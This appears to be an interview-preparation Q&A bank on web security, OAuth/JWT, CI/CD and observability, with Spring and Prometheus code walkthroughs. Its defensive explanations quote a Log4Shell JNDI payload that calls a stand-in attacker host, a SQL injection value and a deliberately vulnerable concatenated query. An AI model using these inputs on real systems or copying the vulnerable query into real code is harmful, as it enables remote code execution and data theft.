---
title: "Security, DevOps & Observability — Q&A Bank (Staff Level)"
slug: security-devops-and-observability-q-and-a-bank
level: L6
module: "Interview Mastery (FAANGM + MNC)"
section: "Staff-Level Interview Question Banks"
type: interview-qa
difficulty: senior
order: 9
tags: [security, devops, observability, ci-cd, monitoring, oauth, jwt, qa-bank, staff]
prerequisites: [microservices-apis-and-cloud-q-and-a-bank]
status: complete
estimated_minutes: 55
last_updated: 2026-06-09
---

# Security, DevOps & Observability — Q&A Bank (Staff Level)

**55+ questions** on web security, OWASP, OAuth/JWT, TLS, password hashing, CI/CD, deployment patterns, observability stacks.

## OWASP Top 10

### Q: What's SQL injection and how do you prevent it?

- **Difficulty:** mid
- **Asked at:** universal security

**Answer.** Attacker injects SQL via input that gets concatenated into a query. `SELECT * FROM users WHERE id = ?` where `?` is `1 OR 1=1` returns all users. Prevention: **PreparedStatement / parameterised queries** — values bound separately, never interpreted as SQL. ORM frameworks (JPA / Hibernate) safe by default unless you use raw SQL with string concat. `@Query("SELECT u FROM User u WHERE u.email = '" + email + "'")` is **vulnerable**; use `:email` parameter.

### Q: XSS — types + prevention?

- **Difficulty:** mid
- **Asked at:** universal security

**Answer.** Cross-Site Scripting injects JavaScript that runs in another user's browser. **Stored** (saved to DB, served to other users); **Reflected** (echoed in URL parameter); **DOM-based** (manipulated by client-side JS). Prevention: **output encoding** based on context (HTML, JS, URL, CSS); **Content Security Policy (CSP)** header restricts script sources; **HttpOnly cookies** prevent JS access to session.

### Q: CSRF — what + prevention?

- **Difficulty:** mid
- **Asked at:** universal security

**Answer.** Cross-Site Request Forgery: attacker's site triggers a state-changing request to your site using the victim's existing session cookie. Prevention: **CSRF tokens** (server-issued, per-request, validated on POST); **SameSite cookies** (`SameSite=Lax` default in modern browsers blocks cross-origin POSTs); custom request headers (browsers don't allow cross-origin custom headers without preflight).

### Q: CSRF vs XSS — different defences?

- **Difficulty:** mid-senior
- **Asked at:** security-deep

**Answer.** **XSS** = "attacker runs JS in your page" → defence: output encoding, CSP. **CSRF** = "attacker makes the user's browser send authenticated requests" → defence: CSRF tokens, SameSite. They're orthogonal; XSS can defeat CSRF (script reads CSRF token). So fix XSS first.

### Q: CORS — how does it actually work?

- **Difficulty:** mid-senior
- **Asked at:** universal web

**Answer.** Browser enforces same-origin policy by default. Cross-origin requests trigger CORS check: browser sends `Origin` header; server responds with `Access-Control-Allow-Origin`. **Preflight** for non-simple requests: browser sends `OPTIONS` first; server's response headers (`Allow-Methods`, `Allow-Headers`) gate the actual request. CORS is enforced by browsers, not servers — non-browser clients ignore it.

### Q: HTTPS handshake — walk through?

- **Difficulty:** senior
- **Asked at:** security-curious

**Answer.** TLS 1.3 (current):
1. Client → ClientHello (supported cipher suites, key share).
2. Server → ServerHello + Certificate + Finished.
3. Client validates cert, computes shared secret, sends Finished.
4. Encrypted data flows.

TLS 1.3 is **1 RTT** (vs 1.2's 2 RTT). With session resumption, **0 RTT** possible (replay risk for non-idempotent). Certificate chain validated against trusted CA roots in browser/OS.

### Q: What's mTLS?

- **Difficulty:** senior
- **Asked at:** modern service-mesh

**Answer.** **Mutual TLS** — both client and server present certificates. Used in service-to-service auth within a network (no need for separate API auth). Service mesh (Istio, Linkerd) handles cert issuance + rotation automatically. Cert authority typically managed by a PKI (cert-manager + Vault). Replaces shared API keys for east-west traffic.

## Authentication + Authorisation

### Q: Authentication vs Authorisation?

- **Difficulty:** junior
- **Asked at:** universal

**Answer.** **AuthN** = "who are you?" (verify identity — password, OAuth, mTLS). **AuthZ** = "what can you do?" (permissions — RBAC, ABAC, policies). Always AuthN before AuthZ.

### Q: OAuth 2.0 — explain authorisation code flow with PKCE.

- **Difficulty:** senior
- **Asked at:** universal modern

**Answer.**
1. Client generates `code_verifier` (random string), computes `code_challenge = SHA256(code_verifier)`.
2. Client redirects user to authz server with `code_challenge`.
3. User authenticates; server redirects back with **authorisation code**.
4. Client POSTs the code + `code_verifier` to token endpoint.
5. Server verifies `SHA256(code_verifier) == challenge`, issues access token + refresh token.

PKCE prevents code-interception attacks (mobile/SPA where client secret can't be kept secret). OAuth 2.1 mandates PKCE for all flows.

### Q: JWT — structure + risks?

- **Difficulty:** mid-senior
- **Asked at:** universal modern

**Answer.** Three base64url-encoded parts: **header** (alg, typ), **payload** (claims: sub, iat, exp, iss, aud, custom), **signature** (HMAC or RSA/ECDSA over header.payload).

Risks:
- **`alg: none`** — server must reject; libraries historically accepted, signing bypassed.
- **HS256 vs RS256 confusion** — if server allows alg from header, attacker can sign with the public key as HMAC.
- **No revocation** — token valid until expiry; can't kick a user mid-session. Mitigate with short expiry + refresh tokens + denylist.
- **Sensitive data in payload** — payload is base64-encoded, not encrypted. Don't put secrets.
- **Long expiry** — increases blast radius if leaked.

### Q: Session vs JWT vs opaque tokens?

- **Difficulty:** senior
- **Asked at:** auth-deep

**Answer.**
- **Session** — server-side state; cookie holds session ID; revocation easy. Stateful — sticky session or shared store needed.
- **JWT** — stateless, self-contained; cryptographically signed. Revocation hard.
- **Opaque token** — server-issued random string; resource server introspects (calls authz server to validate). Revocation easy. Cost: introspection adds latency (or cache it).

Modern: **opaque for first-party access; JWT for federation** (where receiver may not have access to authz server).

### Q: Password hashing — what algorithm?

- **Difficulty:** mid-senior
- **Asked at:** universal security

**Answer.** **bcrypt** (legacy default; slow; per-hash work factor), **scrypt** (memory-hard), **Argon2** (winner of Password Hashing Competition 2015; current best). NEVER use SHA-256/MD5 (too fast — brute-forceable on GPU/ASIC). Per-hash random **salt** prevents rainbow tables. **Tune work factor** so single hash takes ~100ms on your hardware. Spring Security: `BCryptPasswordEncoder(workFactor)` or `Argon2PasswordEncoder`.

### Q: Refresh token rotation — why?

- **Difficulty:** senior
- **Asked at:** modern auth

**Answer.** Each refresh-token use issues new refresh token + invalidates old. If attacker steals a refresh token, they get a new pair on first use — but the legitimate user's next use fails (old refresh already consumed). Detection: server notices double-use of same refresh → revoke entire chain, force re-auth. Standard for OAuth 2.1.

### Q: API key vs OAuth — when each?

- **Difficulty:** mid-senior
- **Asked at:** API security

**Answer.** **API key** — long-lived shared secret; client identity = "the key holder". Simple, good for server-to-server. Risks: leaked key = full access until revoked. No user context. **OAuth** — short-lived access tokens; can encode user identity + scope. Better for client-acting-on-behalf-of-user (mobile/SPA apps). Many APIs offer both: API key for service-to-service, OAuth for end-user-mediated access.

## Encryption + Secrets

### Q: Symmetric vs asymmetric encryption — when each?

- **Difficulty:** mid
- **Asked at:** security-curious

**Answer.** **Symmetric** (AES) — same key encrypts + decrypts; fast (~GB/s). Used for bulk data encryption. Key distribution problem. **Asymmetric** (RSA, ECDSA) — public key encrypts / verifies signature; private key decrypts / signs. Slow (~MB/s). Used for key exchange + signatures, then switch to symmetric for actual data. TLS uses asymmetric to exchange a symmetric session key.

### Q: AES-GCM vs AES-CBC?

- **Difficulty:** senior
- **Asked at:** security-deep

**Answer.** **AES-CBC** — block cipher chaining mode; requires padding; **no built-in authentication** (vulnerable to padding-oracle attacks if not paired with MAC). **AES-GCM** — counter mode + authentication tag (Galois MAC); authenticated encryption (AEAD); standard since TLS 1.2. **Always use GCM** unless legacy reasons force CBC + HMAC.

### Q: Secrets management — env vars vs Vault?

- **Difficulty:** mid-senior
- **Asked at:** modern shops

**Answer.** **Env vars** — easy, but: visible to anyone with shell access; logged accidentally; no rotation; flat namespace. **Vault** (HashiCorp) — dynamic secrets (per-request DB credentials), encryption-as-a-service, automatic rotation, audit log, policies. AWS Secrets Manager / Azure Key Vault / GCP Secret Manager are cloud equivalents. K8s `Secret` is **base64**, not encrypted at rest by default (KMS encryption optional).

### Q: How do you rotate a database password without downtime?

- **Difficulty:** senior
- **Asked at:** secrets-deep

**Answer.**
1. Generate new password.
2. Add new password to user (most DBs support multiple passwords or two users): `ALTER USER app WITH PASSWORD 'new'` plus existing role still valid.
3. Roll out app config with new password to all instances (rolling restart or hot-reload).
4. Verify all instances using new.
5. Remove old password.

With Vault + dynamic secrets: per-request short-lived credentials; rotation is implicit (each credential expires).

## CI/CD

### Q: What goes in a typical CI pipeline?

- **Difficulty:** mid
- **Asked at:** universal modern

**Answer.**
1. **Checkout** code.
2. **Build** (compile + package).
3. **Unit tests** (fast feedback).
4. **Static analysis** — SonarQube, SpotBugs, Checkstyle.
5. **Security scan** — Snyk, Trivy, dependency check.
6. **Integration tests** — Testcontainers + real DB.
7. **Build container image**.
8. **Push** to registry.
9. **Deploy to staging** (sometimes auto, sometimes gated).
10. **Smoke tests / e2e tests**.
11. **Deploy to prod** (gated by approval or fully automated with canary).

### Q: Trunk-based vs gitflow?

- **Difficulty:** mid-senior
- **Asked at:** modern shops

**Answer.** **Trunk-based** — short-lived feature branches (hours-days), merge to main daily, main always deployable; feature flags hide incomplete work. Faster, lower merge pain. **Gitflow** — long-lived develop, feature, release, hotfix branches; complex merging; suits less-frequent releases. **Modern shops mostly use trunk-based**; gitflow when regulatory or release-cadence forces it.

### Q: Blue-green vs canary?

- **Difficulty:** mid-senior
- **Asked at:** universal modern

**Answer.**
- **Blue-green** — two identical envs; deploy to green; flip LB; old (blue) stays for rollback. **Atomic switch**; fast rollback.
- **Canary** — gradually shift traffic to new version (1% → 10% → 50% → 100%); catches problems with real traffic; needs observability for auto-rollback on bad metrics.

Modern shops favour canary for risk reduction.

### Q: Rolling update — how + risks?

- **Difficulty:** mid-senior
- **Asked at:** K8s shops

**Answer.** Default K8s deployment strategy. Replaces pods incrementally — typically 25% surge + 25% unavailable. Risks: **mixed versions running simultaneously** during rollout (must be backwards-compatible); **DB schema** changes must be additive; **API contract** changes need versioning. Slower than blue-green; safer with smaller blast radius per step.

### Q: Database migration — how integrate with CI/CD?

- **Difficulty:** senior
- **Asked at:** modern shops

**Answer.** Use **Flyway** or **Liquibase**: SQL files in version control; tool tracks applied migrations in a metadata table; runs new migrations on app startup or via standalone command. CI/CD applies migrations before deploying new app version. **Migrations must be backwards-compatible** with the OLD app version during rollout (don't drop column app still references). Multi-phase: add column → deploy + dual-write → backfill → switch reads → remove old.

### Q: Feature flags — patterns + pitfalls?

- **Difficulty:** mid-senior
- **Asked at:** modern shops

**Answer.** Patterns: **kill switch** (off in emergency), **gradual rollout** (% of users), **A/B test** (variant assignment), **entitlement** (premium features). Tools: LaunchDarkly, Unleash, Split, FF4J. Pitfalls: **flag debt** — accumulate forever; **untested flag combos** — N flags = 2^N states; **on-by-default fails open** — a flag check that errors should default safely.

### Q: GitOps — what?

- **Difficulty:** mid-senior
- **Asked at:** modern Kubernetes

**Answer.** Git is the source of truth for cluster state. K8s manifests in Git; controllers (ArgoCD, Flux) sync cluster to match Git. Benefits: **declarative**, **auditable** (Git history), **reproducible** (clone repo → recreate cluster), **rollback = git revert**. Replaces imperative `kubectl apply` from CI.

## Observability — Deep

### Q: RED method?

- **Difficulty:** mid-senior
- **Asked at:** modern observability

**Answer.** Service-level metrics:
- **R**ate — requests per second.
- **E**rrors — error rate or count.
- **D**uration — latency distribution.

Per service, per endpoint. Use as the **dashboard default** for any service. Popularised by Tom Wilkie (Weaveworks). Complements USE (Utilisation, Saturation, Errors) for resource-level metrics.

### Q: SLI vs SLO vs SLA?

- **Difficulty:** senior
- **Asked at:** modern reliability

**Answer.** Reiterating from architecture bank:
- **SLI** (Indicator) — measurement (p99 latency, availability %).
- **SLO** (Objective) — internal target.
- **SLA** (Agreement) — external contract with penalties.

Error budget = 1 - SLO. Spend on risky changes; freeze when budget exhausted.

### Q: Burn-rate alerts — what?

- **Difficulty:** senior
- **Asked at:** SRE-heavy

**Answer.** Alert based on **rate of error-budget consumption**, not raw error count. Two-window: **fast burn** (1h window, 14× budget rate) — page immediately; **slow burn** (6h window, 6× rate) — page during business hours. Avoids: alert fatigue from short blips + missed slow degradation. Google SRE workbook is the canonical reference.

### Q: Three pillars — logs / metrics / traces. When each?

- **Difficulty:** mid-senior
- **Asked at:** modern observability

**Answer.**
- **Logs** — discrete events, full context, expensive at scale. Use for debugging individual requests, audit, security forensics.
- **Metrics** — pre-aggregated, cheap, fast to query. Use for dashboards, alerts, capacity planning.
- **Traces** — distributed request flow across services. Use for debugging across-service latency, finding bottlenecks.

Logs + Metrics + Traces should share **correlation IDs** so you can pivot between them.

### Q: Structured logging — why?

- **Difficulty:** mid
- **Asked at:** modern observability

**Answer.** Log as JSON (or other structured format), not free-text. Each log line has fields: `timestamp`, `level`, `service`, `trace_id`, `user_id`, `message`, custom. Searchable + aggregatable in log systems (ELK, Loki, Datadog). Free-text logs require regex parsing — slow + fragile. Spring Boot: `Logback` with `LogstashEncoder`.

### Q: MDC — what?

- **Difficulty:** mid
- **Asked at:** Spring shops

**Answer.** Mapped Diagnostic Context — thread-local key/value map auto-included in logs. Use to propagate request context: `MDC.put("traceId", id); MDC.put("userId", uid);`. Logback's pattern can include `%X{traceId}`. Spring Boot's Micrometer Tracing auto-populates trace + span IDs. Clear with `MDC.clear()` at request end (try-finally) — else thread-pool leaks.

### Q: OpenTelemetry — what + why?

- **Difficulty:** senior
- **Asked at:** modern observability

**Answer.** Vendor-neutral standard for emitting traces + metrics + logs. **OTLP** wire format. SDKs for Java/Python/Go/etc. Auto-instrumentation via Java agent — instruments common libraries (Spring, Jackson, JDBC, Kafka) without code changes. Backend-agnostic — send to Jaeger, Tempo, Datadog, Honeycomb. Replaces vendor-specific SDKs. **Standard 2024+**.

### Q: Micrometer — what + tag cardinality risk?

- **Difficulty:** senior
- **Asked at:** Spring shops

**Answer.** Spring Boot's metrics facade — abstract API over Prometheus, Datadog, CloudWatch, etc. `MeterRegistry.counter("http.requests", "endpoint", "/users").increment()`. **Cardinality risk**: tag values multiply combinations. Adding `user_id` as tag with 1M users → 1M time series → Prometheus melts. Rule: tags should be **bounded enums** (HTTP status, endpoint, host), never high-cardinality values.

### Q: Distributed tracing — how does context propagation work?

- **Difficulty:** senior
- **Asked at:** modern observability

**Answer.** Each request gets a **trace ID** (whole request) + **span ID** (per operation, parent-child). On outgoing call, inject in headers (W3C `traceparent` standard). Downstream service extracts, creates child spans. Result: full timeline of how the request flowed. **Sampling** — head-based (decision at start) vs tail-based (decision at end based on errors/latency); tail catches anomalies but needs full retention buffer.

### Q: Sampling — head vs tail-based?

- **Difficulty:** senior
- **Asked at:** observability-deep

**Answer.** **Head-based** — sample decision at request start (e.g., 1% of requests). Simple, deterministic. Misses interesting tails (errors, slow). **Tail-based** — record everything in a buffer; decide which to keep at the end based on properties (always keep errors, slow > 1s, etc.). More useful, requires buffering infrastructure (OTel Collector tail sampler, Honeycomb).

### Q: Profiling in production — what tools?

- **Difficulty:** senior
- **Asked at:** modern observability

**Answer.** Continuous profiling — sample stack traces continuously, build flame graphs over time. Tools: **Pyroscope**, **Grafana Profiles**, **Datadog Continuous Profiler**, **AWS CodeGuru Profiler**. Java: **JFR** (built-in), **async-profiler** (sample CPU + allocations, very low overhead). Output: flame graphs showing where CPU time goes. Catches issues regular metrics miss.

## Supply Chain Security

### Q: Dependency vulnerabilities — how scan + fix?

- **Difficulty:** mid-senior
- **Asked at:** security-conscious

**Answer.** Tools: **Snyk**, **OWASP Dependency-Check**, **Dependabot**, **Renovate**, **Trivy**. Run on CI; block PR on critical CVE. Auto-PR for minor/patch bumps. **SBOM** (Software Bill of Materials) — list of dependencies + versions, generated per build. Critical post-Log4Shell + Solarwinds.

### Q: Log4Shell — what happened?

- **Difficulty:** senior
- **Asked at:** security + Java seniors

**Answer.** December 2021: Log4j 2.x allowed JNDI lookups in log strings. Attacker sends `${jndi:ldap://attacker.com/x}` in any logged input (User-Agent, payload, etc.); log4j fetches and executes remote code. **CVE-2021-44228**, CVSS 10.0 (max). Patches: 2.17.0 disabled JNDI fully; system property override. Lessons: minimise dynamic features in logging; supply-chain auditing; SBOM tooling exploded after.

### Q: Java deserialisation vulns — what + mitigation?

- **Difficulty:** senior
- **Asked at:** security-deep

**Answer.** `java.io.ObjectInputStream.readObject()` can execute arbitrary code via **gadget chains** — call sequences in commonly-loaded libraries (commons-collections historically) that lead to `Runtime.exec`. Attacker sends crafted bytes; victim deserialises. Mitigation: avoid Java serialisation entirely; use JSON / Protobuf. If must use: **`ObjectInputFilter`** (Java 9+, JEP 290) — whitelist allowed classes.

## Deeper Dive — Code-Backed Walkthroughs

### 1. JWT verification with key rotation (production-grade)

```java
@Component
public class JwtVerifier {
    private final JwksClient jwks;     // fetches public keys from /.well-known/jwks.json

    public Claims verify(String token) throws JwtException {
        // Parse header to find which key signed this token (kid claim)
        DecodedJWT decoded = JWT.decode(token);
        String kid = decoded.getKeyId();

        // Fetch the public key for that kid (cached)
        RSAPublicKey publicKey = jwks.getPublicKey(kid);

        Algorithm algorithm = Algorithm.RSA256(publicKey, null);
        JWTVerifier verifier = JWT.require(algorithm)
            .withIssuer("https://auth.example.com")
            .withAudience("payments-service")
            .acceptLeeway(30)                          // allow 30s clock skew
            .build();

        DecodedJWT verified = verifier.verify(token);

        return Claims.builder()
            .subject(verified.getSubject())
            .issuedAt(verified.getIssuedAt())
            .expiresAt(verified.getExpiresAt())
            .roles(verified.getClaim("roles").asList(String.class))
            .build();
    }
}

@Component
public class JwksClient {
    private final WebClient webClient;
    private final Cache<String, RSAPublicKey> cache;

    public JwksClient(WebClient.Builder builder) {
        this.webClient = builder.baseUrl("https://auth.example.com").build();
        this.cache = Caffeine.newBuilder()
            .expireAfterWrite(Duration.ofHours(1))    // re-fetch keys hourly to catch rotations
            .build();
    }

    public RSAPublicKey getPublicKey(String kid) {
        return cache.get(kid, k -> fetchJwks().stream()
            .filter(jwk -> jwk.kid().equals(k))
            .findFirst()
            .map(this::toRSAPublicKey)
            .orElseThrow(() -> new JwtException("Key not found: " + k)));
    }
    // ...
}
```

### 2. CSRF protection in Spring Security 6 — JWT API + form login

```java
@Configuration
public class SecurityConfig {

    @Bean
    SecurityFilterChain api(HttpSecurity http) throws Exception {
        return http
            .securityMatcher("/api/**")
            .csrf(csrf -> csrf.disable())                          // JWT API → no CSRF needed
            .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(a -> a
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated())
            .oauth2ResourceServer(o -> o.jwt(Customizer.withDefaults()))
            .build();
    }

    @Bean
    @Order(2)
    SecurityFilterChain web(HttpSecurity http) throws Exception {
        return http
            .securityMatcher("/web/**")
            .csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))
            .authorizeHttpRequests(a -> a.anyRequest().authenticated())
            .formLogin(Customizer.withDefaults())
            .build();
    }
}
```

### 3. Password hashing — Argon2 (modern best practice)

```java
@Service
public class PasswordService {
    private final Argon2PasswordEncoder encoder = new Argon2PasswordEncoder(
        16,        // saltLength
        32,        // hashLength
        1,         // parallelism (threads)
        4096,      // memory cost (KB) — start with 4MB, tune up
        3          // iterations
    );

    public String hash(String rawPassword) {
        return encoder.encode(rawPassword);
        // Output: $argon2id$v=19$m=4096,t=3,p=1$<base64-salt>$<base64-hash>
    }

    public boolean verify(String rawPassword, String storedHash) {
        return encoder.matches(rawPassword, storedHash);
    }
}
```

**Why Argon2 not bcrypt**: Argon2 won the 2015 Password Hashing Competition; memory-hard (resists GPU/ASIC attacks better than bcrypt). Bcrypt remains acceptable; SHA-256+salt is not (too fast to brute-force).

### 4. GitHub Actions CI workflow for Spring Boot

```yaml
name: CI
on:
  push: { branches: [main] }
  pull_request: { branches: [main] }

jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: test }
        options: >-
          --health-cmd "pg_isready -U postgres"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
        ports: [5432:5432]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '21', cache: maven }
      - name: Build + test
        run: mvn -B verify
      - name: Snyk scan
        uses: snyk/actions/maven@master
        with: { command: monitor }
        env: { SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }} }
      - name: Upload coverage
        uses: codecov/codecov-action@v4
        with: { token: ${{ secrets.CODECOV_TOKEN }} }

  build-image:
    needs: test
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
      - name: Log in to ECR
        uses: aws-actions/amazon-ecr-login@v2
      - name: Build + push
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.login-ecr.outputs.registry }}/payments:${{ github.sha }}

  deploy:
    needs: build-image
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: ArgoCD sync
        run: |
          sed -i "s|tag: .*|tag: ${{ github.sha }}|" k8s/values.yaml
          git commit -am "Deploy ${{ github.sha }}"
          git push
        # ArgoCD watching this repo will auto-sync the change to the cluster.
```

### 5. Prometheus + Grafana monitoring for Spring Boot service

```java
@Configuration
public class MetricsConfig {
    @Bean
    MeterFilter commonTagsFilter(@Value("${spring.application.name}") String appName,
                                  @Value("${ENVIRONMENT:dev}") String environment) {
        return MeterFilter.commonTags(Tags.of("app", appName, "env", environment));
    }

    @Bean
    TimedAspect timedAspect(MeterRegistry registry) {
        return new TimedAspect(registry);
    }
}

@RestController
public class OrderController {
    private final MeterRegistry registry;
    private final Counter ordersPlaced;
    private final Counter ordersFailed;

    public OrderController(MeterRegistry registry) {
        this.registry = registry;
        this.ordersPlaced = registry.counter("orders.placed");
        this.ordersFailed = registry.counter("orders.failed");
    }

    @PostMapping("/orders")
    @Timed(value = "orders.placement.duration", percentiles = {0.5, 0.95, 0.99})
    public Order place(@RequestBody OrderRequest req) {
        try {
            Order o = service.placeOrder(req);
            ordersPlaced.increment();
            return o;
        } catch (Exception e) {
            ordersFailed.increment();
            registry.counter("orders.failed.by_reason",
                "reason", e.getClass().getSimpleName()).increment();
            throw e;
        }
    }
}
```

**Grafana dashboard PromQL** queries:

```promql
# Request rate (per status code)
sum(rate(http_server_requests_seconds_count[5m])) by (status, uri)

# p99 latency
histogram_quantile(0.99, sum(rate(http_server_requests_seconds_bucket[5m])) by (uri, le))

# Error rate
sum(rate(http_server_requests_seconds_count{status=~"5.."}[5m])) /
sum(rate(http_server_requests_seconds_count[5m]))

# JVM heap
jvm_memory_used_bytes{area="heap"}
```

### 6. Burn-rate alerts (SRE-style)

```yaml
# Prometheus alert rules for SLO burn-rate
groups:
  - name: payments-slo
    rules:
      # SLO: 99.9% success → 0.1% error budget over 30d
      # Fast burn: in 1h, consumed 2% of monthly budget → page now
      - alert: PaymentsFastBurn
        expr: |
          (
            sum(rate(http_server_requests_seconds_count{app="payments",status=~"5.."}[1h]))
            / sum(rate(http_server_requests_seconds_count{app="payments"}[1h]))
          ) > 14 * 0.001                                # 14x faster than budget
        for: 5m
        labels: { severity: critical }
        annotations:
          summary: "Payments SLO fast burn: 14x budget rate"
      # Slow burn: in 6h, consumed 5% of budget → page during business hours
      - alert: PaymentsSlowBurn
        expr: |
          (
            sum(rate(http_server_requests_seconds_count{app="payments",status=~"5.."}[6h]))
            / sum(rate(http_server_requests_seconds_count{app="payments"}[6h]))
          ) > 6 * 0.001
        for: 30m
        labels: { severity: warning }
```

**Why two windows**: fast burn (1h, 14x) catches outages immediately. Slow burn (6h, 6x) catches degradation that would consume budget over the month without immediate symptoms.

## Sources & Further Reading

- [OWASP Top 10](https://owasp.org/Top10/)
- [Google SRE Book](https://sre.google/books/)
- [Cloud Native Computing Foundation](https://www.cncf.io/)
- [Spring Security Reference](https://docs.spring.io/spring-security/reference/)
- [OAuth 2.0 RFC 6749](https://www.rfc-editor.org/rfc/rfc6749) + [OAuth 2.1 draft](https://datatracker.ietf.org/doc/draft-ietf-oauth-v2-1/)
- [OpenTelemetry](https://opentelemetry.io/)
- [Micrometer Documentation](https://micrometer.io/docs)

## Recap

55+ Q&As on OWASP, OAuth/JWT/PKCE, TLS/mTLS, password hashing, secrets, CI/CD patterns, GitOps, blue-green/canary, observability triad (logs/metrics/traces), OpenTelemetry, Micrometer, sampling, supply-chain security.

## Next

Continue to [Behavioural & Leadership (Staff/Principal) — Q&A Bank](./T10-behavioural-and-leadership-staff-principal-q-and-a-bank.md).
